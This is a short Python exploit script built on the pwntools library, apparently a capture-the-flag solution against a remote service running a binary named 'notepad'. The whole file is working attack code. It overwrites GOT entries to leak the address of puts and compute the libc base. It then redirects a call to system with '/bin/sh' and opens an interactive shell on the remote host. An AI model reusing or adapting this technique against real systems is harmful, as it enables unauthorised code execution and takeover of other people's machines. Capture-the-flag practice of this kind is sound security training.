from pwn import *

elf = context.binary = ELF("notepad")
libc = ELF("libc-2.31.so")
# p = process()
p = remote("139.59.220.40", 30001)


payload = pack(elf.symbols['main']).ljust(16) + pack(context.bytes) + pack(elf.got['puts']) + pack(elf.got['exit'])
p.sendline(payload)
p.recvuntil(b'Received\n')
putsleak = u64((p.recvline().strip()).ljust(8, b'\x00')) * 0x100 + 0x20
base = putsleak - libc.symbols['puts']

print(f"Got Libc Base: {hex(base)}")

payload = pack(base + libc.symbols['system']).ljust(16) + pack(context.bytes) + pack(base + next(libc.search(b'/bin/sh'))) + pack(elf.got['puts'])
p.sendline(payload)
p.interactive()
# just cat flag.txt from here